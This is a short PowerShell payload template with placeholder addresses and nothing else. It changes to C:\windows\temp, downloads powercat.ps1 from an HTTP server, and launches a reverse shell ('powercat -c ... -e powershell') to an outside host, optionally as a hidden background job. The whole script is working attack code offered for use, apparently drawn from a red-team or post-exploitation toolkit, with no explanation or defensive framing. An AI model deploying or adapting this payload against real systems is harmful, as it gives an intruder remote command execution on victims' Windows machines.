$background = $true;
cd C:\windows\temp;
try { $fileExists = Test-Path "powercat.ps1" } catch { $fileExists = $false };
if (-not $fileExists) { iwr -Uri "http://${http_ip}:${http_port}/powercat.ps1" -OutFile "powercat.ps1";};
if (-not $background) {
    . .\powercat.ps1;
    powercat -c  ${host_ip} -p ${host_port} -e powershell;
}
else {
    Start-Job -ScriptBlock {
        cd c:\windows\temp;
        . .\powercat.ps1;
        powercat -c  ${host_ip} -p ${host_port} -e powershell;
    }
}
